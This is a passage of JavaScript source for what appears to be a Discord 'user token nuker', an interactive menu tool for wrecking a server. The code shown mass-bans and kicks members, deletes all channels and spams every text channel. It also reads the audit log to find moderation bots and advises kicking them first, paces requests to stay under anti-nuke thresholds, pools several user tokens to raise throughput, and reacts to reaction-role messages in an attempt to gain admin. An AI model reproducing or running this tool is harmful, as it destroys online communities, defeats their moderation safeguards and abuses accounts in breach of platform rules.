    20: 'MEMBER_KICK', 21: 'MEMBER_PRUNE', 22: 'MEMBER_BAN_ADD', 23: 'MEMBER_BAN_REMOVE',
    24: 'MEMBER_UPDATE', 25: 'MEMBER_ROLE_UPDATE', 26: 'MEMBER_MOVE', 27: 'MEMBER_DISCONNECT',
    30: 'ROLE_CREATE', 31: 'ROLE_UPDATE', 32: 'ROLE_DELETE',
    40: 'INVITE_CREATE', 41: 'INVITE_UPDATE', 42: 'INVITE_DELETE',
    50: 'WEBHOOK_CREATE', 51: 'WEBHOOK_UPDATE', 52: 'WEBHOOK_DELETE',
    60: 'EMOJI_CREATE', 61: 'EMOJI_UPDATE', 62: 'EMOJI_DELETE',
    72: 'MESSAGE_DELETE', 73: 'MESSAGE_BULK_DELETE', 74: 'MESSAGE_PIN', 75: 'MESSAGE_UNPIN',
};

async function securityProbe() {
    const logs = await api('GET', `/guilds/${GUILD_ID}/audit-logs?limit=100`).catch(() => null);
    if (!logs) {
        console.log('[!] no audit log access (you need VIEW_AUDIT_LOG)');
        console.log('    without it the tool is blind to who is punishing you');
        return;
    }
    const entries = logs.audit_log_entries || [];
    const users = logs.users || [];
    const findUser = id => users.find(u => u.id === id) || {};
    const nameOf = id => findUser(id).username || id;

    console.log(`[i] ${entries.length} audit entries pulled`);

    const byActor = new Map();
    for (const e of entries) {
        const key = e.user_id || 'unknown';
        const rec = byActor.get(key) || { count: 0, actions: new Map(), last: 0 };
        rec.count++;
        const a = AUDIT_NAMES[e.action_type] || `action_${e.action_type}`;
        rec.actions.set(a, (rec.actions.get(a) || 0) + 1);
        byActor.set(key, rec);
    }

    for (const [id, rec] of byActor) {
        const u = findUser(id);
        console.log(`\n  ${nameOf(id)} (${id})${u.bot ? ' [BOT]' : ''} - ${rec.count} actions`);
        for (const [a, c] of rec.actions) console.log(`    ${a} x${c}`);
    }

    const bots = [...byActor.entries()].filter(([id]) => findUser(id).bot);
    const punisher = bots.find(([, rec]) => rec.actions.has('MEMBER_BAN_ADD') || rec.actions.has('MEMBER_KICK'));
    const restorer = bots.find(([, rec]) => rec.actions.has('CHANNEL_CREATE') || rec.actions.has('CHANNEL_DELETE'));

    console.log('\n=== VERDICT ===');
    if (punisher) {
        console.log(`  PUNISHER : ${nameOf(punisher[0])} (${punisher[0]}) - bans/kicks on record`);
        console.log('  strategy : kill it first (menu 13 or 19), it reads the audit log and reacts');
    }
    if (restorer) {
        console.log(`  RESTORER : ${nameOf(restorer[0])} (${restorer[0]}) - recreates/deletes channels`);
        console.log('  strategy : it will undo deletes - ban/kick it before touching channels');
    }
    if (!punisher && !restorer) {
        console.log(bots.length
            ? `  ${bots.length} bot(s) seen, none punishing yet`
            : '  no bot activity in the audit log');
        console.log('  strategy : RAPID - nothing is watching the log');
    }
}

async function showLog() {
    if (!fs.existsSync(LOG_PATH)) return console.log('[i] no log file yet - run an action first');
    const lines = fs.readFileSync(LOG_PATH, 'utf8').trim().split('\n').slice(-40);
    console.log(`[i] ${LOG_PATH} (last ${lines.length} requests)`);
    for (const l of lines) {
        try {
            const j = JSON.parse(l);
            console.log(`  ${j.t.slice(11, 19)} ${j.s} ${j.m} ${j.p.slice(0, 90)}${j.rem ? ` rem=${j.rem}` : ''}`);
        } catch (e) { console.log('  ' + l.slice(0, 120)); }
    }
}

// permission math: OR every role the member has + @everyone
const P = {
    ADMINISTRATOR: 0x8n, MANAGE_ROLES: 0x10000000n, MANAGE_CHANNELS: 0x10n,
    MANAGE_GUILD: 0x20n, BAN_MEMBERS: 0x4n, KICK_MEMBERS: 0x2n,
    VIEW_AUDIT_LOG: 0x80n, MANAGE_MESSAGES: 0x2000n, MANAGE_WEBHOOKS: 0x20000000n,
};
function permsFor(guild, roles, member) {
    let p = 0n;
    const everyone = roles.find(r => r.id === guild.id);
    if (everyone) p |= BigInt(everyone.permissions);
    for (const rid of (member.roles || [])) {
        const r = roles.find(x => x.id === rid);
        if (r) p |= BigInt(r.permissions);
    }
    return p;
}
function permList(p) {
    const out = [];
    for (const [k, v] of Object.entries(P)) if ((p & v) === v) out.push(k);
    return out;
}

async function accessReport() {
    const me = await api('GET', '/users/@me');
    const g = await api('GET', `/guilds/${GUILD_ID}`);
    const roles = (await api('GET', `/guilds/${GUILD_ID}/roles`)) || [];
    const member = await api('GET', `/guilds/${GUILD_ID}/members/${me.id}`);
    const p = permsFor(g, roles, member);
    const owner = g.owner_id === me.id;
    console.log(`\n  user   : ${me.username} (${me.id})`);
    console.log(`  guild  : ${g.name}`);
    console.log(`  owner  : ${owner ? 'YES - you own this server' : 'no'}`);
    console.log(`  roles  : ${(member.roles || []).length}`);
    (member.roles || []).forEach(rid => {
        const r = roles.find(x => x.id === rid);
        if (r) console.log(`    - ${r.name} (pos ${r.position})`);
    });
    console.log(`  perms  : ${owner ? 'ALL (owner)' : (permList(p).join(', ') || 'none beyond @everyone')}`);
    console.log(`  can ban members   : ${owner || (p & P.BAN_MEMBERS) === P.BAN_MEMBERS || (p & P.ADMINISTRATOR) === P.ADMINISTRATOR ? 'yes' : 'NO'}`);
    console.log(`  can manage roles  : ${owner || (p & P.MANAGE_ROLES) === P.MANAGE_ROLES || (p & P.ADMINISTRATOR) === P.ADMINISTRATOR ? 'yes' : 'NO'}`);
    console.log(`  can see audit log : ${owner || (p & P.VIEW_AUDIT_LOG) === P.VIEW_AUDIT_LOG || (p & P.ADMINISTRATOR) === P.ADMINISTRATOR ? 'yes' : 'NO'}`);
    console.log(`  can delete chans  : ${owner || (p & P.MANAGE_CHANNELS) === P.MANAGE_CHANNELS || (p & P.ADMINISTRATOR) === P.ADMINISTRATOR ? 'yes' : 'NO'}`);
}

// hunt every reaction-role message in the guild and react to all of them,
// then re-claim roles. this is the only auto-role trigger reachable over REST.
async function autoRoleHunter() {
    const chans = await fetchChannels();
    const text = chans.filter(c => c.type === 0 || c.type === 5).slice(0, 40);
    console.log(`[+] scanning ${text.length} channels for reaction-role messages...`);

    let messages = 0, reacted = 0, failed = 0;
    for (const ch of text) {
        const ms = await api('GET', `/channels/${ch.id}/messages?limit=50`).catch(() => []);
        if (!Array.isArray(ms)) continue;
        for (const m of ms) {
            if (!m.reactions || m.reactions.length === 0) continue;
            messages++;
            for (const r of m.reactions) {
                const emoji = r.emoji.id ? `${r.emoji.name}:${r.emoji.id}` : encodeURIComponent(r.emoji.name);
                try {
                    await api('PUT', `/channels/${ch.id}/messages/${m.id}/reactions/${emoji}/@me`, null, 3);
                    reacted++;
                } catch (e) { failed++; }
            }
        }
    }
    console.log(`[OK] ${reacted} reactions added across ${messages} messages (${failed} failed)`);
    console.log('[i] waiting 3s for auto-role bots to react...');
    await sleep(3000);

    const me = await api('GET', '/users/@me');
    const roles = (await api('GET', `/guilds/${GUILD_ID}/roles`)) || [];
    const member = await api('GET', `/guilds/${GUILD_ID}/members/${me.id}`).catch(() => null);
    if (member) {
        const mine = (member.roles || []).map(id => (roles.find(r => r.id === id) || {}).name).filter(Boolean);
        console.log(`  roles now: ${mine.join(', ') || 'none'}`);
        const admin = (member.roles || []).some(id => {
            const r = roles.find(x => x.id === id);
            return r && r.permissions && (BigInt(r.permissions) & 0x8n) === 0x8n;
        });
        console.log(admin ? '[OK] ADMIN obtained' : '[i] no admin yet - buttons/slash roles need a gateway interaction');
    }
}

async function myPerms() {
    const me = await api('GET', '/users/@me');
    const g = await api('GET', `/guilds/${GUILD_ID}`);
    const roles = (await api('GET', `/guilds/${GUILD_ID}/roles`)) || [];
    const member = await api('GET', `/guilds/${GUILD_ID}/members/${me.id}`).catch(() => null);
    const p = member ? permsFor(g, roles, member) : 0n;
    return { me, g, roles, member, owner: g.owner_id === me.id, p };
}

async function preflight(bit, label) {
    const { owner, p } = await myPerms();
    const ok = owner || (p & bit) === bit || (p & P.ADMINISTRATOR) === P.ADMINISTRATOR;
    if (!ok) {
        console.log(`[!] blocked: this account has no ${label} in ${GUILD_ID}`);
        console.log('    run option 10 for the full permission report');
        return false;
    }
    return true;
}

// ---- MENUS ----

async function nextMenu() {
    while (true) {
        console.log('\n-- NEXT STEP ' + '-'.repeat(30));
        console.log('  1. Delete ALL voice channels');
        console.log('  2. Create voice channels');
        console.log('  3. Create text channels');
        console.log('  4. Delete ALL channels');
        console.log('  5. Spam a channel');
        console.log('  6. Spam ALL text channels');
        console.log('  0. Back to main menu');
        const c = await ask('NEXT> ');
        if (c === '0') return;
        try {
            if (c === '1') await deleteVoice();
            else if (c === '2') await promptCreate(true);
            else if (c === '3') await promptCreate(false);
            else if (c === '4') await deleteChannels();
            else if (c === '5') {
                const cid = await ask('Channel ID> ');
                const msg = await ask('Message> ');
                const times = parseInt(await ask('How many> ')) || 10;
                await spamAll(cid, msg, times);
            } else if (c === '6') await spamAllTextChannels();
            else console.log('  pick 0-6');
        } catch (e) {
            console.log(`[!] ${e.message}`);
        }
    }
}

async function mainMenu() {
    while (true) {
        console.log('\n====================================');
        console.log(`   USER TOKEN NUKER | guild ${GUILD_ID}`);
        console.log(`   rate ${limiter.rate}/s${STEALTH ? ' | STEALTH ON' : ''}${RAPID ? ' | RAPID ON' : ''}`);
        console.log('====================================');
        console.log('   1. BAN ALL (bulk + pool)');
        console.log('   2. KICK ALL');
        console.log('   3. UNBAN ALL');
        console.log('   4. Delete ALL channels');
        console.log('   5. Delete voice channels');
        console.log('   6. Create voice channels');
        console.log('   7. Create text channels');
        console.log('   8. Spam a channel');
        console.log('   9. Change server ID');
        console.log('  10. Check access (owner/admin)');
        console.log('  11. Stealth mode ON/OFF (anti-nuke radar)');
        console.log('  12. Watchdog scan (find admin bots)');
        console.log('  13. Neutralize watchdogs (kick them)');
        console.log('  14. Spam ALL text channels');
        console.log('  15. Save layout template (1 request snapshot)');
        console.log('  16. Create server from template (instant channels)');
        console.log('  17. RAPID mode ON/OFF (ignore bucket waits)');
        console.log('  18. Ban by ID list (no member fetch)');
        console.log('  19. AUTO: recon -> bypass -> nuke');
        console.log('  20. Claim ALL roles below you (1 request)');
        console.log('  21. Grab reaction roles (message)');
        console.log('  22. Join invite + auto-claim roles');
        console.log('  23. Auto-join invite LIST + claim admin');
        console.log('  24. Security probe (audit log -> verdict)');
        console.log('  25. Show request log (nuke.log)');
        console.log('  26. Auto-role hunter (react to every role message)');
        console.log('   0. Exit');
        const c = await ask('Select> ');
        try {
            if (c === '0') { console.log('Bye'); process.exit(0); }
            else if (c === '1') { await banAll(); await nextMenu(); }
            else if (c === '2') { await kickAll(); await nextMenu(); }
            else if (c === '3') await unbanAll();
            else if (c === '4') await deleteChannels();
            else if (c === '5') await deleteVoice();
            else if (c === '6') await promptCreate(true);
            else if (c === '7') await promptCreate(false);
            else if (c === '8') {
                const cid = await ask('Channel ID> ');
                const msg = await ask('Message> ');
                const times = parseInt(await ask('How many> ')) || 10;
                await spamAll(cid, msg, times);
            }
            else if (c === '9') {
                GUILD_ID = await ask('New server ID> ');
                console.log(`[+] guild -> ${GUILD_ID}`);
            }
            else if (c === '10') await accessReport();
            else if (c === '11') {
                STEALTH = !STEALTH;
                limiter.applyStealth(STEALTH);
                console.log(`[+] stealth ${STEALTH ? 'ON - pacing ' + limiter.rate + '/s, under anti-nuke thresholds' : 'OFF - full speed'}`);
            }
            else if (c === '12') await watchdogScan();
            else if (c === '13') await neutralizeWatchdogs();
            else if (c === '14') await spamAllTextChannels();
            else if (c === '15') await saveTemplate();
            else if (c === '16') await guildFromTemplate();
            else if (c === '17') {
                RAPID = !RAPID;
                if (RAPID) { limiter.rate = 40; limiter.max = 45; }
                else { limiter.rate = 12; limiter.max = 14; }
                console.log(`[+] rapid ${RAPID ? 'ON - 40/s, no bucket waits' : 'OFF - 12/s safe pacing'}`);
            }
            else if (c === '18') await banByIds();
            else if (c === '19') await autoNuke();
            else if (c === '20') await claimRoles();
            else if (c === '21') await grabReactions();
            else if (c === '22') await joinAndClaim();
            else if (c === '23') await autoJoinList();
            else if (c === '24') await securityProbe();
            else if (c === '25') await showLog();
            else if (c === '26') await autoRoleHunter();
            else console.log('  pick 0-26');
        } catch (e) {
            console.log(`[!] ${e.message}`);
        }
    }
}

// ---- STARTUP ----
(async function start() {
    console.log('\n====================================');
    console.log('  USER-ACCOUNT NUKER (owner/admin)');
    console.log('====================================\n');
    loadEnv();

    if (!TOKEN) {
        TOKEN = await ask('USER TOKEN> ');
        if (TOKEN.startsWith('Bot ')) TOKEN = TOKEN.slice(4);
    }
    if (TOKENS.length === 0) TOKENS = [TOKEN];
    else if (!TOKENS.includes(TOKEN)) TOKENS.unshift(TOKEN);

    // multi-token: every token is its own rate-limit lane
    if (TOKENS.length > 1) {
        const n = TOKENS.length;
        limiter.rate = Math.min(12 * n, 300);
        limiter.max  = Math.min(14 * n, 320);
        console.log(`[i] ${n} tokens loaded -> combined pace ${limiter.rate}/s`);
    }

    // validate every token, drop the dead ones
    const live = [];
    for (const t of TOKENS) {
        try {
            const r = await fetch(API + '/users/@me', { headers: { Authorization: t } });
            if (r.ok) {
                const u = await r.json();
                live.push(t);
                console.log(`[OK] token ${live.length}: ${u.username} (${u.id})`);
            } else {
                console.log(`[!] token rejected (${r.status}) - dropped`);
            }
        } catch (e) {
            console.log(`[!] token check failed: ${e.message}`);
        }
    }
    if (live.length === 0) { console.log('[!] no usable tokens'); process.exit(1); }
    TOKENS = live;
    TOKEN = TOKENS[0];
    tokenIdx = 0;
    TOKENS.forEach((t, i) => tokenLane.set(t, i));
    // pre-warm sockets so the first burst doesn't pay TCP/TLS setup
    await Promise.all([1, 2, 3, 4].map(() =>
        fetch(API + '/users/@me', { headers: { Authorization: TOKEN } }).catch(() => {})));
    if (TOKENS.length > 1) {
        limiter.rate = Math.min(44 * TOKENS.length, 470);
        limiter.max  = Math.min(47 * TOKENS.length, 480);
        console.log(`[i] combined pace: ${limiter.rate}/s`);
    }
    try {
        const first = TOKEN.split('.')[0];
        const id = Buffer.from(first, 'base64').toString('utf8');
        if (/^\d{17,20}$/.test(id)) console.log(`[i] token user id: ${id}`);
    } catch (e) {}

    const me = await api('GET', '/users/@me').catch(e => { console.log(`[!] bad token: ${e.message}`); process.exit(1); });
    console.log(`[OK] logged in as ${me.username}`);

    if (!GUILD_ID) GUILD_ID = await ask('SERVER ID> ');
    const g = await api('GET', `/guilds/${GUILD_ID}`).catch(() => null);
    if (!g) { console.log('[!] cannot see that server - wrong id or not a member'); process.exit(1); }
    const owner = g.owner_id === me.id;
    console.log(`[OK] ${g.name} | ${owner ? 'you are OWNER' : 'checking admin...'}`);
    console.log('[i] mode: USER TOKEN only (no app bot)');
    console.log('[i] token safety: one instance at a time, same IP, no VPN switching, keep the session alive');

    await mainMenu();
})();
